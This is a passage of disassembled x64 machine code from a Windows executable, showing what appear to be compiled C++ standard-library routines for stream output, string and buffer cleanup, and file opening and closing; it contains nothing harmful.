   140004bd0:	57                   	push   %rdi
   140004bd1:	41 56                	push   %r14
   140004bd3:	48 83 ec 30          	sub    $0x30,%rsp
   140004bd7:	48 8b f1             	mov    %rcx,%rsi
   140004bda:	33 db                	xor    %ebx,%ebx
   140004bdc:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   140004be0:	48 8b 01             	mov    (%rcx),%rax
   140004be3:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004be7:	48 8b 7c 0a 28       	mov    0x28(%rdx,%rcx,1),%rdi
   140004bec:	48 85 ff             	test   %rdi,%rdi
   140004bef:	7e 12                	jle    0x140004c03
   140004bf1:	48 81 ff 11 03 00 00 	cmp    $0x311,%rdi
   140004bf8:	7e 09                	jle    0x140004c03
   140004bfa:	48 81 c7 ef fc ff ff 	add    $0xfffffffffffffcef,%rdi
   140004c01:	eb 02                	jmp    0x140004c05
   140004c03:	33 ff                	xor    %edi,%edi
   140004c05:	4c 8b f6             	mov    %rsi,%r14
   140004c08:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004c0d:	48 8b 4c 0a 48       	mov    0x48(%rdx,%rcx,1),%rcx
   140004c12:	48 85 c9             	test   %rcx,%rcx
   140004c15:	74 07                	je     0x140004c1e
   140004c17:	48 8b 01             	mov    (%rcx),%rax
   140004c1a:	ff 50 08             	call   *0x8(%rax)
   140004c1d:	90                   	nop
   140004c1e:	48 8b 06             	mov    (%rsi),%rax
   140004c21:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004c25:	48 03 ce             	add    %rsi,%rcx
   140004c28:	ff 15 12 45 00 00    	call   *0x4512(%rip)        # 0x140009140
   140004c2e:	84 c0                	test   %al,%al
   140004c30:	75 06                	jne    0x140004c38
   140004c32:	88 44 24 28          	mov    %al,0x28(%rsp)
   140004c36:	eb 39                	jmp    0x140004c71
   140004c38:	48 8b 06             	mov    (%rsi),%rax
   140004c3b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004c3f:	48 8b 4c 31 50       	mov    0x50(%rcx,%rsi,1),%rcx
   140004c44:	48 85 c9             	test   %rcx,%rcx
   140004c47:	74 21                	je     0x140004c6a
   140004c49:	48 3b ce             	cmp    %rsi,%rcx
   140004c4c:	74 1c                	je     0x140004c6a
   140004c4e:	ff 15 dc 45 00 00    	call   *0x45dc(%rip)        # 0x140009230
   140004c54:	48 8b 06             	mov    (%rsi),%rax
   140004c57:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004c5b:	48 03 ce             	add    %rsi,%rcx
   140004c5e:	ff 15 dc 44 00 00    	call   *0x44dc(%rip)        # 0x140009140
   140004c64:	88 44 24 28          	mov    %al,0x28(%rsp)
   140004c68:	eb 07                	jmp    0x140004c71
   140004c6a:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140004c6f:	b0 01                	mov    $0x1,%al
   140004c71:	84 c0                	test   %al,%al
   140004c73:	75 0a                	jne    0x140004c7f
   140004c75:	bb 04 00 00 00       	mov    $0x4,%ebx
   140004c7a:	e9 b2 00 00 00       	jmp    0x140004d31
   140004c7f:	48 8b 16             	mov    (%rsi),%rdx
   140004c82:	48 63 42 04          	movslq 0x4(%rdx),%rax
   140004c86:	8b 4c 30 18          	mov    0x18(%rax,%rsi,1),%ecx
   140004c8a:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   140004c90:	83 f9 40             	cmp    $0x40,%ecx
   140004c93:	74 29                	je     0x140004cbe
   140004c95:	48 85 ff             	test   %rdi,%rdi
   140004c98:	7e 21                	jle    0x140004cbb
   140004c9a:	48 8b 06             	mov    (%rsi),%rax
   140004c9d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004ca1:	0f b6 54 31 58       	movzbl 0x58(%rcx,%rsi,1),%edx
   140004ca6:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140004cab:	ff 15 a7 45 00 00    	call   *0x45a7(%rip)        # 0x140009258
   140004cb1:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004cb4:	74 52                	je     0x140004d08
   140004cb6:	48 ff cf             	dec    %rdi
   140004cb9:	eb da                	jmp    0x140004c95
   140004cbb:	48 8b 16             	mov    (%rsi),%rdx
   140004cbe:	48 63 4a 04          	movslq 0x4(%rdx),%rcx
   140004cc2:	41 b8 11 03 00 00    	mov    $0x311,%r8d
   140004cc8:	48 8d 15 11 51 00 00 	lea    0x5111(%rip),%rdx        # 0x140009de0
   140004ccf:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140004cd4:	ff 15 86 45 00 00    	call   *0x4586(%rip)        # 0x140009260
   140004cda:	48 3d 11 03 00 00    	cmp    $0x311,%rax
   140004ce0:	75 26                	jne    0x140004d08
   140004ce2:	48 85 ff             	test   %rdi,%rdi
   140004ce5:	7e 2a                	jle    0x140004d11
   140004ce7:	48 8b 06             	mov    (%rsi),%rax
   140004cea:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cee:	0f b6 54 31 58       	movzbl 0x58(%rcx,%rsi,1),%edx
   140004cf3:	48 8b 4c 31 48       	mov    0x48(%rcx,%rsi,1),%rcx
   140004cf8:	ff 15 5a 45 00 00    	call   *0x455a(%rip)        # 0x140009258
   140004cfe:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004d01:	74 05                	je     0x140004d08
   140004d03:	48 ff cf             	dec    %rdi
   140004d06:	eb da                	jmp    0x140004ce2
   140004d08:	bb 04 00 00 00       	mov    $0x4,%ebx
   140004d0d:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   140004d11:	48 8b 06             	mov    (%rsi),%rax
   140004d14:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d18:	48 c7 44 31 28 00 00 	movq   $0x0,0x28(%rcx,%rsi,1)
   140004d1f:	00 00 
   140004d21:	eb 0e                	jmp    0x140004d31
   140004d23:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004d28:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   140004d2c:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140004d31:	48 8b 06             	mov    (%rsi),%rax
   140004d34:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d38:	48 03 ce             	add    %rsi,%rcx
   140004d3b:	45 33 c0             	xor    %r8d,%r8d
   140004d3e:	8b d3                	mov    %ebx,%edx
   140004d40:	ff 15 02 45 00 00    	call   *0x4502(%rip)        # 0x140009248
   140004d46:	90                   	nop
   140004d47:	ff 15 73 44 00 00    	call   *0x4473(%rip)        # 0x1400091c0
   140004d4d:	84 c0                	test   %al,%al
   140004d4f:	75 0a                	jne    0x140004d5b
   140004d51:	49 8b ce             	mov    %r14,%rcx
   140004d54:	ff 15 ce 44 00 00    	call   *0x44ce(%rip)        # 0x140009228
   140004d5a:	90                   	nop
   140004d5b:	49 8b 06             	mov    (%r14),%rax
   140004d5e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d62:	4a 8b 4c 31 48       	mov    0x48(%rcx,%r14,1),%rcx
   140004d67:	48 85 c9             	test   %rcx,%rcx
   140004d6a:	74 07                	je     0x140004d73
   140004d6c:	48 8b 01             	mov    (%rcx),%rax
   140004d6f:	ff 50 10             	call   *0x10(%rax)
   140004d72:	90                   	nop
   140004d73:	48 8b c6             	mov    %rsi,%rax
   140004d76:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004d7b:	48 83 c4 30          	add    $0x30,%rsp
   140004d7f:	41 5e                	pop    %r14
   140004d81:	5f                   	pop    %rdi
   140004d82:	5e                   	pop    %rsi
   140004d83:	c3                   	ret
   140004d84:	cc                   	int3
   140004d85:	cc                   	int3
   140004d86:	cc                   	int3
   140004d87:	cc                   	int3
   140004d88:	cc                   	int3
   140004d89:	cc                   	int3
   140004d8a:	cc                   	int3
   140004d8b:	cc                   	int3
   140004d8c:	cc                   	int3
   140004d8d:	cc                   	int3
   140004d8e:	cc                   	int3
   140004d8f:	cc                   	int3
   140004d90:	40 53                	rex push %rbx
   140004d92:	48 83 ec 30          	sub    $0x30,%rsp
   140004d96:	48 8b d9             	mov    %rcx,%rbx
   140004d99:	48 8b 09             	mov    (%rcx),%rcx
   140004d9c:	48 85 c9             	test   %rcx,%rcx
   140004d9f:	74 3a                	je     0x140004ddb
   140004da1:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140004da5:	48 2b d1             	sub    %rcx,%rdx
   140004da8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004daf:	72 18                	jb     0x140004dc9
   140004db1:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004db5:	48 83 c2 27          	add    $0x27,%rdx
   140004db9:	48 2b c8             	sub    %rax,%rcx
   140004dbc:	48 83 e9 08          	sub    $0x8,%rcx
   140004dc0:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004dc4:	77 1b                	ja     0x140004de1
   140004dc6:	48 8b c8             	mov    %rax,%rcx
   140004dc9:	e8 52 1f 00 00       	call   0x140006d20
   140004dce:	33 c0                	xor    %eax,%eax
   140004dd0:	48 89 03             	mov    %rax,(%rbx)
   140004dd3:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140004dd7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004ddb:	48 83 c4 30          	add    $0x30,%rsp
   140004ddf:	5b                   	pop    %rbx
   140004de0:	c3                   	ret
   140004de1:	33 c0                	xor    %eax,%eax
   140004de3:	45 33 c9             	xor    %r9d,%r9d
   140004de6:	45 33 c0             	xor    %r8d,%r8d
   140004de9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004dee:	33 d2                	xor    %edx,%edx
   140004df0:	33 c9                	xor    %ecx,%ecx
   140004df2:	ff 15 48 47 00 00    	call   *0x4748(%rip)        # 0x140009540
   140004df8:	cc                   	int3
   140004df9:	cc                   	int3
   140004dfa:	cc                   	int3
   140004dfb:	cc                   	int3
   140004dfc:	cc                   	int3
   140004dfd:	cc                   	int3
   140004dfe:	cc                   	int3
   140004dff:	cc                   	int3
   140004e00:	40 53                	rex push %rbx
   140004e02:	48 83 ec 30          	sub    $0x30,%rsp
   140004e06:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004e0a:	48 8b d9             	mov    %rcx,%rbx
   140004e0d:	48 83 fa 07          	cmp    $0x7,%rdx
   140004e11:	76 31                	jbe    0x140004e44
   140004e13:	48 8b 09             	mov    (%rcx),%rcx
   140004e16:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004e1d:	00 
   140004e1e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004e25:	72 18                	jb     0x140004e3f
   140004e27:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004e2b:	48 83 c2 27          	add    $0x27,%rdx
   140004e2f:	48 2b c8             	sub    %rax,%rcx
   140004e32:	48 83 e9 08          	sub    $0x8,%rcx
   140004e36:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004e3a:	77 1f                	ja     0x140004e5b
   140004e3c:	48 8b c8             	mov    %rax,%rcx
   140004e3f:	e8 dc 1e 00 00       	call   0x140006d20
   140004e44:	33 c0                	xor    %eax,%eax
   140004e46:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140004e4d:	00 
   140004e4e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004e52:	66 89 03             	mov    %ax,(%rbx)
   140004e55:	48 83 c4 30          	add    $0x30,%rsp
   140004e59:	5b                   	pop    %rbx
   140004e5a:	c3                   	ret
   140004e5b:	33 c0                	xor    %eax,%eax
   140004e5d:	45 33 c9             	xor    %r9d,%r9d
   140004e60:	45 33 c0             	xor    %r8d,%r8d
   140004e63:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004e68:	33 d2                	xor    %edx,%edx
   140004e6a:	33 c9                	xor    %ecx,%ecx
   140004e6c:	ff 15 ce 46 00 00    	call   *0x46ce(%rip)        # 0x140009540
   140004e72:	cc                   	int3
   140004e73:	cc                   	int3
   140004e74:	cc                   	int3
   140004e75:	cc                   	int3
   140004e76:	cc                   	int3
   140004e77:	cc                   	int3
   140004e78:	cc                   	int3
   140004e79:	cc                   	int3
   140004e7a:	cc                   	int3
   140004e7b:	cc                   	int3
   140004e7c:	cc                   	int3
   140004e7d:	cc                   	int3
   140004e7e:	cc                   	int3
   140004e7f:	cc                   	int3
   140004e80:	40 53                	rex push %rbx
   140004e82:	48 83 ec 30          	sub    $0x30,%rsp
   140004e86:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140004e8a:	48 8b d9             	mov    %rcx,%rbx
   140004e8d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004e91:	76 2c                	jbe    0x140004ebf
   140004e93:	48 8b 09             	mov    (%rcx),%rcx
   140004e96:	48 ff c2             	inc    %rdx
   140004e99:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004ea0:	72 18                	jb     0x140004eba
   140004ea2:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004ea6:	48 83 c2 27          	add    $0x27,%rdx
   140004eaa:	48 2b c8             	sub    %rax,%rcx
   140004ead:	48 83 e9 08          	sub    $0x8,%rcx
   140004eb1:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004eb5:	77 21                	ja     0x140004ed8
   140004eb7:	48 8b c8             	mov    %rax,%rcx
   140004eba:	e8 61 1e 00 00       	call   0x140006d20
   140004ebf:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   140004ec6:	00 
   140004ec7:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140004ece:	00 
   140004ecf:	c6 03 00             	movb   $0x0,(%rbx)
   140004ed2:	48 83 c4 30          	add    $0x30,%rsp
   140004ed6:	5b                   	pop    %rbx
   140004ed7:	c3                   	ret
   140004ed8:	45 33 c9             	xor    %r9d,%r9d
   140004edb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140004ee2:	00 00 
   140004ee4:	45 33 c0             	xor    %r8d,%r8d
   140004ee7:	33 d2                	xor    %edx,%edx
   140004ee9:	33 c9                	xor    %ecx,%ecx
   140004eeb:	ff 15 4f 46 00 00    	call   *0x464f(%rip)        # 0x140009540
   140004ef1:	cc                   	int3
   140004ef2:	cc                   	int3
   140004ef3:	cc                   	int3
   140004ef4:	cc                   	int3
   140004ef5:	cc                   	int3
   140004ef6:	cc                   	int3
   140004ef7:	cc                   	int3
   140004ef8:	cc                   	int3
   140004ef9:	cc                   	int3
   140004efa:	cc                   	int3
   140004efb:	cc                   	int3
   140004efc:	cc                   	int3
   140004efd:	cc                   	int3
   140004efe:	cc                   	int3
   140004eff:	cc                   	int3
   140004f00:	40 53                	rex push %rbx
   140004f02:	55                   	push   %rbp
   140004f03:	56                   	push   %rsi
   140004f04:	57                   	push   %rdi
   140004f05:	41 56                	push   %r14
   140004f07:	48 83 ec 70          	sub    $0x70,%rsp
   140004f0b:	48 8b 05 2e 91 00 00 	mov    0x912e(%rip),%rax        # 0x14000e040
   140004f12:	48 33 c4             	xor    %rsp,%rax
   140004f15:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140004f1a:	41 8b f8             	mov    %r8d,%edi
   140004f1d:	48 8b da             	mov    %rdx,%rbx
   140004f20:	4c 8b f1             	mov    %rcx,%r14
   140004f23:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004f28:	33 ed                	xor    %ebp,%ebp
   140004f2a:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140004f2e:	48 8d 05 93 52 00 00 	lea    0x5293(%rip),%rax        # 0x14000a1c8
   140004f35:	48 89 01             	mov    %rax,(%rcx)
   140004f38:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140004f3f:	ff 15 0b 43 00 00    	call   *0x430b(%rip)        # 0x140009250
   140004f45:	90                   	nop
   140004f46:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140004f4d:	00 
   140004f4e:	49 8d 76 08          	lea    0x8(%r14),%rsi
   140004f52:	45 33 c9             	xor    %r9d,%r9d
   140004f55:	45 33 c0             	xor    %r8d,%r8d
   140004f58:	48 8b d6             	mov    %rsi,%rdx
   140004f5b:	49 8b ce             	mov    %r14,%rcx
   140004f5e:	ff 15 2c 42 00 00    	call   *0x422c(%rip)        # 0x140009190
   140004f64:	90                   	nop
   140004f65:	49 8b 06             	mov    (%r14),%rax
   140004f68:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004f6c:	48 8d 05 35 52 00 00 	lea    0x5235(%rip),%rax        # 0x14000a1a8
   140004f73:	4a 89 04 31          	mov    %rax,(%rcx,%r14,1)
   140004f77:	49 8b 06             	mov    (%r14),%rax
   140004f7a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004f7e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140004f84:	42 89 54 31 fc       	mov    %edx,-0x4(%rcx,%r14,1)
   140004f89:	48 8b ce             	mov    %rsi,%rcx
   140004f8c:	ff 15 7e 42 00 00    	call   *0x427e(%rip)        # 0x140009210
   140004f92:	48 8d 05 8f 51 00 00 	lea    0x518f(%rip),%rax        # 0x14000a128
   140004f99:	48 89 06             	mov    %rax,(%rsi)
   140004f9c:	40 88 6e 7c          	mov    %bpl,0x7c(%rsi)
   140004fa0:	40 88 6e 71          	mov    %bpl,0x71(%rsi)
   140004fa4:	48 8b ce             	mov    %rsi,%rcx
   140004fa7:	ff 15 73 42 00 00    	call   *0x4273(%rip)        # 0x140009220
   140004fad:	48 89 ae 80 00 00 00 	mov    %rbp,0x80(%rsi)
   140004fb4:	48 8b 05 c5 99 00 00 	mov    0x99c5(%rip),%rax        # 0x14000e980
   140004fbb:	48 89 46 74          	mov    %rax,0x74(%rsi)
   140004fbf:	48 89 6e 68          	mov    %rbp,0x68(%rsi)
   140004fc3:	83 cf 02             	or     $0x2,%edi
   140004fc6:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004fcc:	8b d7                	mov    %edi,%edx
   140004fce:	48 8b cb             	mov    %rbx,%rcx
   140004fd1:	ff 15 01 42 00 00    	call   *0x4201(%rip)        # 0x1400091d8
   140004fd7:	48 8b d8             	mov    %rax,%rbx
   140004fda:	48 85 c0             	test   %rax,%rax
   140004fdd:	0f 84 db 00 00 00    	je     0x1400050be
   140004fe3:	c6 46 7c 01          	movb   $0x1,0x7c(%rsi)
   140004fe7:	40 88 6e 71          	mov    %bpl,0x71(%rsi)
   140004feb:	48 8b ce             	mov    %rsi,%rcx
   140004fee:	ff 15 2c 42 00 00    	call   *0x422c(%rip)        # 0x140009220
   140004ff4:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004ff9:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140004ffe:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140005003:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140005008:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000500d:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140005012:	48 8b cb             	mov    %rbx,%rcx
   140005015:	ff 15 8d 45 00 00    	call   *0x458d(%rip)        # 0x1400095a8
   14000501b:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140005020:	48 89 46 18          	mov    %rax,0x18(%rsi)
   140005024:	48 89 46 20          	mov    %rax,0x20(%rsi)
   140005028:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000502d:	48 89 46 38          	mov    %rax,0x38(%rsi)
   140005031:	48 89 46 40          	mov    %rax,0x40(%rsi)
   140005035:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000503a:	48 89 46 50          	mov    %rax,0x50(%rsi)
   14000503e:	48 89 46 58          	mov    %rax,0x58(%rsi)
   140005042:	48 89 9e 80 00 00 00 	mov    %rbx,0x80(%rsi)
   140005049:	48 8b 05 30 99 00 00 	mov    0x9930(%rip),%rax        # 0x14000e980
   140005050:	48 89 46 74          	mov    %rax,0x74(%rsi)
   140005054:	48 89 6e 68          	mov    %rbp,0x68(%rsi)
   140005058:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000505d:	48 8b ce             	mov    %rsi,%rcx
   140005060:	ff 15 b2 41 00 00    	call   *0x41b2(%rip)        # 0x140009218
   140005066:	90                   	nop
   140005067:	48 8b c8             	mov    %rax,%rcx
   14000506a:	e8 71 10 00 00       	call   0x1400060e0
   14000506f:	48 8b d8             	mov    %rax,%rbx
   140005072:	48 8b c8             	mov    %rax,%rcx
   140005075:	ff 15 b5 40 00 00    	call   *0x40b5(%rip)        # 0x140009130
   14000507b:	84 c0                	test   %al,%al
   14000507d:	74 06                	je     0x140005085
   14000507f:	48 89 6e 68          	mov    %rbp,0x68(%rsi)
   140005083:	eb 0e                	jmp    0x140005093
   140005085:	48 89 5e 68          	mov    %rbx,0x68(%rsi)
   140005089:	48 8b ce             	mov    %rsi,%rcx
   14000508c:	ff 15 8e 41 00 00    	call   *0x418e(%rip)        # 0x140009220
   140005092:	90                   	nop
   140005093:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140005098:	48 85 c9             	test   %rcx,%rcx
   14000509b:	74 1c                	je     0x1400050b9
   14000509d:	48 8b 01             	mov    (%rcx),%rax
   1400050a0:	ff 50 10             	call   *0x10(%rax)
   1400050a3:	48 85 c0             	test   %rax,%rax
   1400050a6:	74 11                	je     0x1400050b9
   1400050a8:	48 8b 08             	mov    (%rax),%rcx
   1400050ab:	4c 8b 01             	mov    (%rcx),%r8
   1400050ae:	ba 01 00 00 00       	mov    $0x1,%edx
   1400050b3:	48 8b c8             	mov    %rax,%rcx
   1400050b6:	41 ff d0             	call   *%r8
   1400050b9:	48 85 f6             	test   %rsi,%rsi
   1400050bc:	75 19                	jne    0x1400050d7
   1400050be:	49 8b 06             	mov    (%r14),%rax
   1400050c1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400050c5:	49 03 ce             	add    %r14,%rcx
   1400050c8:	45 33 c0             	xor    %r8d,%r8d
   1400050cb:	ba 02 00 00 00       	mov    $0x2,%edx
   1400050d0:	ff 15 72 41 00 00    	call   *0x4172(%rip)        # 0x140009248
   1400050d6:	90                   	nop
   1400050d7:	49 8b c6             	mov    %r14,%rax
   1400050da:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400050df:	48 33 cc             	xor    %rsp,%rcx
   1400050e2:	e8 19 1c 00 00       	call   0x140006d00
   1400050e7:	48 83 c4 70          	add    $0x70,%rsp
   1400050eb:	41 5e                	pop    %r14
   1400050ed:	5f                   	pop    %rdi
   1400050ee:	5e                   	pop    %rsi
   1400050ef:	5d                   	pop    %rbp
   1400050f0:	5b                   	pop    %rbx
   1400050f1:	c3                   	ret
   1400050f2:	cc                   	int3
   1400050f3:	cc                   	int3
   1400050f4:	cc                   	int3
   1400050f5:	cc                   	int3
   1400050f6:	cc                   	int3
   1400050f7:	cc                   	int3
   1400050f8:	cc                   	int3
   1400050f9:	cc                   	int3
   1400050fa:	cc                   	int3
   1400050fb:	cc                   	int3
   1400050fc:	cc                   	int3
   1400050fd:	cc                   	int3
   1400050fe:	cc                   	int3
   1400050ff:	cc                   	int3
   140005100:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005105:	57                   	push   %rdi
   140005106:	48 83 ec 20          	sub    $0x20,%rsp
   14000510a:	48 8b d9             	mov    %rcx,%rbx
   14000510d:	48 8b ca             	mov    %rdx,%rcx
   140005110:	e8 cb 0f 00 00       	call   0x1400060e0
   140005115:	48 8b c8             	mov    %rax,%rcx
   140005118:	48 8b f8             	mov    %rax,%rdi
   14000511b:	ff 15 0f 40 00 00    	call   *0x400f(%rip)        # 0x140009130
   140005121:	84 c0                	test   %al,%al
   140005123:	74 13                	je     0x140005138
   140005125:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   14000512c:	00 
   14000512d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005132:	48 83 c4 20          	add    $0x20,%rsp
   140005136:	5f                   	pop    %rdi
   140005137:	c3                   	ret
   140005138:	48 8b cb             	mov    %rbx,%rcx
   14000513b:	48 89 7b 68          	mov    %rdi,0x68(%rbx)
   14000513f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005144:	48 83 c4 20          	add    $0x20,%rsp
   140005148:	5f                   	pop    %rdi
   140005149:	48 ff 25 d0 40 00 00 	rex.W jmp *0x40d0(%rip)        # 0x140009220
   140005150:	40 53                	rex push %rbx
   140005152:	48 83 ec 20          	sub    $0x20,%rsp
   140005156:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   14000515d:	00 
   14000515e:	48 8b d9             	mov    %rcx,%rbx
   140005161:	74 2d                	je     0x140005190
   140005163:	48 8b 01             	mov    (%rcx),%rax
   140005166:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000516b:	ff 50 18             	call   *0x18(%rax)
   14000516e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005171:	74 1d                	je     0x140005190
   140005173:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000517a:	ff 15 38 44 00 00    	call   *0x4438(%rip)        # 0x1400095b8
   140005180:	33 c9                	xor    %ecx,%ecx
   140005182:	85 c0                	test   %eax,%eax
   140005184:	0f 99 c1             	setns  %cl
   140005187:	8d 41 ff             	lea    -0x1(%rcx),%eax
   14000518a:	48 83 c4 20          	add    $0x20,%rsp
   14000518e:	5b                   	pop    %rbx
   14000518f:	c3                   	ret
   140005190:	33 c0                	xor    %eax,%eax
   140005192:	48 83 c4 20          	add    $0x20,%rsp
   140005196:	5b                   	pop    %rbx
   140005197:	c3                   	ret
   140005198:	cc                   	int3
   140005199:	cc                   	int3
   14000519a:	cc                   	int3
   14000519b:	cc                   	int3
   14000519c:	cc                   	int3
   14000519d:	cc                   	int3
   14000519e:	cc                   	int3
   14000519f:	cc                   	int3
   1400051a0:	40 53                	rex push %rbx
   1400051a2:	56                   	push   %rsi
   1400051a3:	48 83 ec 48          	sub    $0x48,%rsp
   1400051a7:	48 8b 05 92 8e 00 00 	mov    0x8e92(%rip),%rax        # 0x14000e040
   1400051ae:	48 33 c4             	xor    %rsp,%rax
   1400051b1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400051b6:	33 f6                	xor    %esi,%esi
   1400051b8:	4d 8b c8             	mov    %r8,%r9
   1400051bb:	48 8b d9             	mov    %rcx,%rbx
   1400051be:	48 85 d2             	test   %rdx,%rdx
   1400051c1:	75 0b                	jne    0x1400051ce
   1400051c3:	4d 85 c0             	test   %r8,%r8
   1400051c6:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400051cc:	74 03                	je     0x1400051d1
   1400051ce:	44 8b c6             	mov    %esi,%r8d
   1400051d1:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1400051d8:	48 85 c9             	test   %rcx,%rcx
   1400051db:	0f 84 9e 00 00 00    	je     0x14000527f
   1400051e1:	ff 15 79 43 00 00    	call   *0x4379(%rip)        # 0x140009560
   1400051e7:	85 c0                	test   %eax,%eax
   1400051e9:	0f 85 90 00 00 00    	jne    0x14000527f
   1400051ef:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   1400051f4:	48 8b cb             	mov    %rbx,%rcx
   1400051f7:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   1400051fe:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   140005202:	40 88 73 71          	mov    %sil,0x71(%rbx)
   140005206:	ff 15 14 40 00 00    	call   *0x4014(%rip)        # 0x140009220
   14000520c:	48 85 ff             	test   %rdi,%rdi
   14000520f:	74 4e                	je     0x14000525f
   140005211:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140005216:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000521b:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140005220:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140005225:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000522a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000522f:	48 8b cf             	mov    %rdi,%rcx
   140005232:	ff 15 70 43 00 00    	call   *0x4370(%rip)        # 0x1400095a8
   140005238:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000523d:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140005241:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   140005245:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000524a:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   14000524e:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140005252:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005257:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   14000525b:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   14000525f:	48 8b 0d 1a 97 00 00 	mov    0x971a(%rip),%rcx        # 0x14000e980
   140005266:	48 8b c3             	mov    %rbx,%rax
   140005269:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   140005270:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140005275:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   140005279:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   14000527d:	eb 02                	jmp    0x140005281
   14000527f:	33 c0                	xor    %eax,%eax
   140005281:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005286:	48 33 cc             	xor    %rsp,%rcx
   140005289:	e8 72 1a 00 00       	call   0x140006d00
   14000528e:	48 83 c4 48          	add    $0x48,%rsp
